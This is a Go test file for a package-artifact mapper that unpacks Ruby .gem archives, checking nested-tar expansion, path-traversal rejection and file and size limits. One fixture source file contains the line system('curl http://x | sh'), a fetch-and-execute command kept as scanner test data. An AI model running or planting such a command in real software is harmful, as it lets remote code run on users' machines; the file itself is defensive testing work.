package artifactmap

import (
	"archive/tar"
	"bytes"
	"compress/gzip"
	"strings"
	"testing"
)

// buildTar is buildTGZ without the gzip layer, in entry order.
func buildTar(t *testing.T, entries [][2]string) []byte {
	t.Helper()
	var buf bytes.Buffer
	tw := tar.NewWriter(&buf)
	for _, e := range entries {
		if err := tw.WriteHeader(&tar.Header{Name: e[0], Mode: 0o644, Size: int64(len(e[1]))}); err != nil {
			t.Fatalf("WriteHeader: %v", err)
		}
		if _, err := tw.Write([]byte(e[1])); err != nil {
			t.Fatalf("Write: %v", err)
		}
	}
	if err := tw.Close(); err != nil {
		t.Fatalf("tar Close: %v", err)
	}
	return buf.Bytes()
}

func gz(t *testing.T, b []byte) string {
	t.Helper()
	var buf bytes.Buffer
	w := gzip.NewWriter(&buf)
	w.Write(b)
	w.Close()
	return buf.String()
}

// buildGem lays a .gem out the way `gem build` does: a plain outer tar of
// metadata.gz, data.tar.gz and checksums.yaml.gz.
func buildGem(t *testing.T, data [][2]string) []byte {
	t.Helper()
	return buildTar(t, [][2]string{
		{"metadata.gz", gz(t, []byte("--- !ruby/object:Gem::Specification\nname: demo\n"))},
		{"data.tar.gz", gz(t, buildTar(t, data))},
		{"checksums.yaml.gz", gz(t, []byte("---\nSHA256: {}\n"))},
	})
}

func TestBuild_GemMapsDataTarGz(t *testing.T) {
	payload := buildGem(t, [][2]string{
		{"lib/demo.rb", "system('curl http://x | sh')\n"},
		{"ext/demo/extconf.rb", "require 'mkmf'\n"},
		{"demo.gemspec", "Gem::Specification.new { |s| s.name = 'demo' }\n"},
		{"../escape.rb", "evil\n"},
		{"/abs.rb", "evil\n"},
	})
	res := Build(payload, Options{})
	for _, p := range []string{"lib/demo.rb", "ext/demo/extconf.rb", "demo.gemspec", "metadata.gz", "checksums.yaml.gz"} {
		if _, ok := res.Files[p]; !ok {
			t.Errorf("missing %s; have %v", p, res.Files.SortedPaths())
		}
	}
	if _, ok := res.Files["data.tar.gz"]; ok {
		t.Error("data.tar.gz blob kept; its entries should replace it")
	}
	if f := res.Files["lib/demo.rb"]; f.Kind != KindSource || !strings.Contains(string(f.Bytes), "curl") {
		t.Errorf("lib/demo.rb = kind %d %q", f.Kind, f.Bytes)
	}
	if res.Files["demo.gemspec"].Kind != KindManifest {
		t.Error("inner gemspec should classify as a manifest")
	}
	for _, p := range res.Files.SortedPaths() {
		if strings.Contains(p, "..") || strings.HasPrefix(p, "/") || strings.Contains(p, "escape") || strings.Contains(p, "abs") {
			t.Errorf("traversal entry mapped: %s", p)
		}
	}
	if res.Truncated {
		t.Error("small gem should not be truncated")
	}
}

// Expansion is one level and only for a plain outer tar: a data.tar.gz
// nested inside a gem, or shipped inside an npm .tgz, stays a blob.
func TestBuild_GemExpansionIsOneLevelAndGemOnly(t *testing.T) {
	nested := gz(t, buildTar(t, [][2]string{{"deep.rb", "x\n"}}))
	res := Build(buildGem(t, [][2]string{{"data.tar.gz", nested}}), Options{})
	if _, ok := res.Files["deep.rb"]; ok {
		t.Error("nested data.tar.gz was expanded a second time")
	}
	if _, ok := res.Files["data.tar.gz"]; !ok {
		t.Error("nested data.tar.gz should be kept as a file")
	}

	npm := Build(buildTGZ(t, map[string]string{"data.tar.gz": nested}), Options{})
	if _, ok := npm.Files["deep.rb"]; ok {
		t.Error("data.tar.gz inside a gzipped tarball was expanded")
	}
}

// The inner walk shares the outer budget: MaxFiles and MaxRetainedBytes
// count both levels together, and hitting either sets Truncated.
func TestBuild_GemBoundsShared(t *testing.T) {
	var data [][2]string
	for i := 0; i < 10; i++ {
		data = append(data, [2]string{"lib/f" + string(rune('a'+i)) + ".rb", strings.Repeat("x", 100)})
	}
	res := Build(buildGem(t, data), Options{MaxFiles: 4})
	if len(res.Files) != 4 || !res.Truncated {
		t.Errorf("MaxFiles=4: got %d files, truncated=%v", len(res.Files), res.Truncated)
	}
	res = Build(buildGem(t, data), Options{MaxRetainedBytes: 250})
	if res.TotalBytes > 250+PerFileCap || !res.Truncated {
		t.Errorf("MaxRetainedBytes=250: total=%d truncated=%v", res.TotalBytes, res.Truncated)
	}
	if len(res.Files) >= 12 {
		t.Errorf("retention cap did not stop the inner walk: %d files", len(res.Files))
	}
}
